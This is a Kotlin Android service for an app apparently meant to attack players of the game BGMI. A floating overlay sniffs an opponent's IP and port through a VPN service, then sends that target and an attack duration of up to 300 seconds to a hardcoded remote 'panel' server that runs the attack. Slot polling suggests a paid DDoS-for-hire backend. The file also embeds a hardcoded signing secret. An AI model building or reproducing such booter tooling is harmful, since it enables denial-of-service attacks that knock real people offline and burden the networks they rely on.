package com.teamjadugar.apk

import android.animation.ObjectAnimator
import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.media.AudioManager
import android.media.ToneGenerator
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

class FloatingService : Service() {

    private lateinit var windowManager: WindowManager
    private var floatingView: View? = null
    private var bubbleView: View? = null
    private var overlayView: View? = null

    private var etIp: EditText? = null
    private var etPort: EditText? = null
    private var tvTime: TextView? = null
    private var btnAttack: Button? = null
    private var btnGetIp: Button? = null
    private var tvLog: TextView? = null
    private var tvSlots: TextView? = null
    private var tvBubbleTimer: TextView? = null

    private var selectedTime = 120
    private var isAttacking = false
    private var pulseAnimator: ObjectAnimator? = null
    private var slotsThread: Thread? = null
    private var overlayShown = false
    private var toneGenerator: ToneGenerator? = null

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var etPortRef: EditText? = null
        var btnGetIpRef: Button? = null

        const val MAX_ATTACK_SECONDS = 300
        const val MIN_ATTACK_SECONDS = 30
        private const val PANEL_URL = "http://13.211.179.172:5000"
        private const val HMAC_KEY = "SPECTRE_SECURE_2026"
        
        val attackExecutor = Executors.newSingleThreadExecutor()

        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(ip); etPortRef?.setText(port)
                btnGetIpRef?.text = "IP FOUND ✅"
                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                Toast.makeText(instance, "BGMI IP Caught: $ip", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun playSound(type: String) {
        try {
            if (toneGenerator == null) toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
            when (type) {
                "click" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_BEEP, 50)
                "success" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_ACK, 150)
                "error" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_NACK, 150)
            }
        } catch (e: Exception) {}
    }

    private val paramsPanel = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, PixelFormat.TRANSLUCENT)

    private val paramsBubble = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT)

    private val paramsOverlay = WindowManager.LayoutParams(
        WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT)

    override fun onCreate() {
        super.onCreate()
        instance = this
        try {
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

            paramsPanel.gravity = Gravity.TOP or Gravity.START
            paramsPanel.x = 50; paramsPanel.y = 150
            floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)

            paramsBubble.gravity = Gravity.TOP or Gravity.START
            paramsBubble.x = 50; paramsBubble.y = 150
            bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)

            overlayView = LayoutInflater.from(this).inflate(R.layout.layout_big_timer, null)
            paramsOverlay.gravity = Gravity.CENTER

            if (floatingView != null) {
                windowManager.addView(floatingView, paramsPanel)
            }

            // 🩸 SAFE VIEW FINDING
            etIp = floatingView?.findViewById(R.id.fEtIp)
            etPort = floatingView?.findViewById(R.id.fEtPort)
            tvTime = floatingView?.findViewById(R.id.fTvTime)
            tvLog = floatingView?.findViewById(R.id.tvLog)
            tvSlots = floatingView?.findViewById(R.id.tvSlots)
            btnAttack = floatingView?.findViewById(R.id.fBtnAttack)
            btnGetIp = floatingView?.findViewById(R.id.fBtnGetIp)
            tvBubbleTimer = bubbleView?.findViewById(R.id.tvBubbleTimer)

            val btnVpnOff = floatingView?.findViewById<Button>(R.id.fBtnVpnOff)
            val seekBar = floatingView?.findViewById<SeekBar>(R.id.fSeekBar)

            etIpRef = etIp; etPortRef = etPort; btnGetIpRef = btnGetIp

            startButtonPulse()
            updateSlotsFromPanel()

            floatingView?.findViewById<TextView>(R.id.btnClose)?.setOnClickListener { 
                playSound("click")
                stopSelf() 
            }
            floatingView?.findViewById<TextView>(R.id.btnMinimize)?.setOnClickListener {
                playSound("click")
                floatingView?.let { windowManager.removeView(it) }
                bubbleView?.let { windowManager.addView(it, paramsBubble) }
            }
            setupBubbleDrag()
            bubbleView?.setOnClickListener {
                playSound("click")
                bubbleView?.let { windowManager.removeView(it) }
                floatingView?.let { windowManager.addView(it, paramsPanel) }
            }

            seekBar?.max = MAX_ATTACK_SECONDS - MIN_ATTACK_SECONDS
            seekBar?.progress = 90
            selectedTime = MIN_ATTACK_SECONDS + (seekBar?.progress ?: 90)
            tvTime?.text = "ATTACK DURATION: ${selectedTime}s"

            seekBar?.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
                override fun onProgressChanged(sb: SeekBar?, progress: Int, fromUser: Boolean) {
                    val c = (MIN_ATTACK_SECONDS + progress).coerceIn(MIN_ATTACK_SECONDS, MAX_ATTACK_SECONDS)
                    selectedTime = c
                    tvTime?.text = "ATTACK DURATION: ${c}s"
                }
                override fun onStartTrackingTouch(sb: SeekBar?) {}
                override fun onStopTrackingTouch(sb: SeekBar?) {}
            })

            btnGetIp?.setOnClickListener {
                playSound("click")
                tvLog?.text = "> SNIFFING BGMI..."
                btnGetIp?.text = "SNIFFING..."; btnGetIp?.isEnabled = false
                startService(Intent(this, VpnService::class.java))
            }
            btnVpnOff?.setOnClickListener {
                playSound("click")
                stopService(Intent(this, VpnService::class.java))
                tvLog?.text = "> VPN STOPPED"
                btnGetIp?.text = "GET IP"; btnGetIp?.isEnabled = true
                btnGetIp?.setBackgroundColor(android.graphics.Color.parseColor("#1A102E"))
                btnGetIp?.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
            }

            btnAttack?.setOnClickListener {
                if (isAttacking) {
                    playSound("error")
                    Toast.makeText(this, "Attack already running!", Toast.LENGTH_SHORT).show(); return@setOnClickListener
                }
                val ip = etIp?.text.toString().trim()
                val portStr = etPort?.text.toString().trim()
                
                val portInt = portStr.toIntOrNull()
                if (ip.isEmpty() || portInt == null) {
                    playSound("error")
                    Toast.makeText(this, "IP or Valid Port missing!", Toast.LENGTH_SHORT).show(); return@setOnClickListener
                }
                if (selectedTime > MAX_ATTACK_SECONDS) selectedTime = MAX_ATTACK_SECONDS

                playSound("click")
                isAttacking = true
                pulseAnimator?.cancel()
                btnAttack?.text = "LAUNCHING..."
                btnAttack?.isEnabled = false
                
                startAttack(ip, portInt, selectedTime)
            }

            setupPanelDragAndResize()
        } catch (e: Exception) {
            stopSelf()
        }
    }

    private fun startButtonPulse() {
        pulseAnimator?.cancel()
        btnAttack?.let { btn ->
            pulseAnimator = ObjectAnimator.ofFloat(btn, "alpha", 1f, 0.6f, 1f).apply {
                duration = 1000; repeatCount = ObjectAnimator.INFINITE; start()
            }
        }
    }

    private fun updateSlotsFromPanel() {
        slotsThread?.interrupt()
        slotsThread = Thread {
            while (true) {
                try {
                    val url = URL("$PANEL_URL/connect/slots")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.connectTimeout = 3000; conn.readTimeout = 3000
                    if (conn.responseCode == 200) {
                        val res = conn.inputStream.bufferedReader().readText()
                        val json = JSONObject(res)
                        val used = json.optInt("slots_used", 0)
                        val total = json.optInt("slots_total", 10)
                        Handler(Looper.getMainLooper()).post {
                            tvSlots?.text = "SLOTS: $used/$total"
                            tvSlots?.setTextColor(if (used >= total) android.graphics.Color.parseColor("#EF4444") else android.graphics.Color.parseColor("#00E5FF"))
                        }
                    }
                } catch (_: InterruptedException) { break }
                catch (_: Exception) {}
                try { Thread.sleep(5000) } catch (_: InterruptedException) { break }
            }
        }.apply { isDaemon = true; start() }
    }

    private fun startAttack(ip: String, port: Int, durationSec: Int) {
        attackExecutor.execute {
            var ok = false
            var errMsg = ""
            try {
                val key = SessionStore.currentKey(this)
                if (key.isEmpty()) {
                    Handler(Looper.getMainLooper()).post {
                        resetAttackButton()
                        tvLog?.text = "> KEY EMPTY"
                        playSound("error")
                        Toast.makeText(this, "Key missing — login again", Toast.LENGTH_LONG).show()
                    }
                    return@execute
                }

                val url = URL("$PANEL_URL/connect/action")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 10000; conn.readTimeout = 15000

                val body = JSONObject().apply {
                    put("key", key); put("ip", ip); put("port", port); put("time", durationSec)
                }.toString()

                val mac = Mac.getInstance("HmacSHA256")
                mac.init(SecretKeySpec(HMAC_KEY.toByteArray(), "HmacSHA256"))
                val signature = mac.doFinal(body.toByteArray()).joinToString("") { String.format("%02x", it) }
                conn.setRequestProperty("X-App-Signature", signature)

                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }

                val code = conn.responseCode
                val resp = (if (code in 200..299) conn.inputStream else conn.errorStream)?.bufferedReader()?.readText() ?: ""

                if (code in 200..299) {
                    try {
                        val json = JSONObject(resp)
                        val valid = json.optBoolean("valid", false)
                        val attackOk = json.optBoolean("attack", true)
                        val msg = json.optString("msg", "")
                        ok = valid && attackOk
                        if (!ok) errMsg = msg.ifEmpty { "rejected" }
                    } catch (e: Exception) { errMsg = "bad json: $resp" }
                } else errMsg = "HTTP $code: $resp"
            } catch (e: Exception) {
                errMsg = e.message ?: "network error"
            }

            Handler(Looper.getMainLooper()).post {
                if (ok) {
                    playSound("success")
                    btnAttack?.text = "LAUNCHED ✅"
                    btnAttack?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                    tvLog?.text = "> ATTACK STARTED"
                    runCountdown(durationSec)
                } else {
                    playSound("error")
                    resetAttackButton()
                    tvLog?.text = "> FAIL: $errMsg"
                    Toast.makeText(this, "Attack fail: $errMsg", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun resetAttackButton() {
        isAttacking = false
        btnAttack?.let {
            it.text = "LAUNCH ATTACK"
            it.isEnabled = true
            it.setBackgroundColor(android.graphics.Color.parseColor("#1A102E"))
            startButtonPulse()
        }
    }

    private fun runCountdown(totalSec: Int) {
        Thread {
            var remaining = totalSec
            try {
                while (remaining > 0) {
                    val r = remaining
                    Handler(Looper.getMainLooper()).post {
                        tvLog?.text = "⏱ ${r}s"
                        tvLog?.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                        tvBubbleTimer?.visibility = View.VISIBLE
                        tvBubbleTimer?.text = "${r}s"
                        if (r <= 3) showBigOverlay(r)
                    }
                    Thread.sleep(1000)
                    remaining--
                }
                Handler(Looper.getMainLooper()).post {
                    tvBubbleTimer?.visibility = View.GONE
                    tvLog?.text = ""
                    showFinishedOverlay()
                    resetAttackButton()
                }
            } catch (_: InterruptedException) {}
        }.apply { isDaemon = true; start() }
    }

    private fun showBigOverlay(num: Int) {
        if (!overlayShown) {
            try { overlayView?.let { windowManager.addView(it, paramsOverlay) }; overlayShown = true } catch (_: Exception) {}
        }
        val tvBig = overlayView?.findViewById<TextView>(R.id.tvBigTimer)
        val tvMsg = overlayView?.findViewById<TextView>(R.id.tvBigMsg)
        tvBig?.textSize = 200f
        tvBig?.text = "$num"
        tvBig?.setTextColor(android.graphics.Color.parseColor("#FF1744"))
        tvMsg?.textSize = 34f
        tvMsg?.text = "GET READY"
        tvMsg?.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
        tvBig?.scaleX = 0.6f; tvBig?.scaleY = 0.6f
        tvBig?.animate()?.scaleX(1.2f)?.scaleY(1.2f)?.setDuration(250)?.withEndAction {
            tvBig?.animate()?.scaleX(1f)?.scaleY(1f)?.setDuration(150)?.start()
        }?.start()
    }

    private fun showFinishedOverlay() {
        if (!overlayShown) {
            try { overlayView?.let { windowManager.addView(it, paramsOverlay) }; overlayShown = true } catch (_: Exception) {}
        }
        val tvBig = overlayView?.findViewById<TextView>(R.id.tvBigTimer)
        val tvMsg = overlayView?.findViewById<TextView>(R.id.tvBigMsg)
        tvBig?.textSize = 110f
        tvBig?.text = "✅"
        tvBig?.setTextColor(android.graphics.Color.parseColor("#22C55E"))
        tvMsg?.textSize = 46f
        tvMsg?.text = "ATTACK FINISHED"
        tvMsg?.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
        Handler(Looper.getMainLooper()).postDelayed({ hideOverlay() }, 2000)
    }

    private fun hideOverlay() {
        if (overlayShown) {
            try { overlayView?.let { windowManager.removeView(it) } } catch (_: Exception) {}
            overlayShown = false
        }
    }

    private var initialX = 0; private var initialY = 0
    private var initialTouchX = 0f; private var initialTouchY = 0f

    private fun setupPanelDragAndResize() {
        val header = floatingView?.findViewById<LinearLayout>(R.id.headerLayout)
        header?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialX = paramsPanel.x; initialY = paramsPanel.y
                    initialTouchX = event.rawX; initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    paramsPanel.x = initialX + (event.rawX - initialTouchX).toInt()
                    paramsPanel.y = initialY + (event.rawY - initialTouchY).toInt()
                    try { floatingView?.let { windowManager.updateViewLayout(it, paramsPanel) } } catch (_: Exception) {}
                    true
                }
                else -> false
            }
        }
    }

    private var bubbleInitialX = 0; private var bubbleInitialY = 0
    private var bubbleInitialTouchX = 0f; private var bubbleInitialTouchY = 0f
    private var isBubbleDragging = false

    private fun setupBubbleDrag() {
        bubbleView?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    bubbleInitialX = paramsBubble.x; bubbleInitialY = paramsBubble.y
                    bubbleInitialTouchX = event.rawX; bubbleInitialTouchY = event.rawY
                    isBubbleDragging = false; true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = event.rawX - bubbleInitialTouchX
                    val dy = event.rawY - bubbleInitialTouchY
                    if (Math.abs(dx) > 10 || Math.abs(dy) > 10) {
                        isBubbleDragging = true
                        paramsBubble.x = bubbleInitialX + dx.toInt()
                        paramsBubble.y = bubbleInitialY + dy.toInt()
                        bubbleView?.let { windowManager.updateViewLayout(it, paramsBubble) }
                    }
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!isBubbleDragging) bubbleView?.performClick()
                    true
                }
                else -> false
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pulseAnimator?.cancel()
        slotsThread?.interrupt()
        hideOverlay()
        try { floatingView?.let { windowManager.removeView(it) } } catch (_: Exception) {}
        try { bubbleView?.let { windowManager.removeView(it) } } catch (_: Exception) {}
        toneGenerator?.release()
        instance = null
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
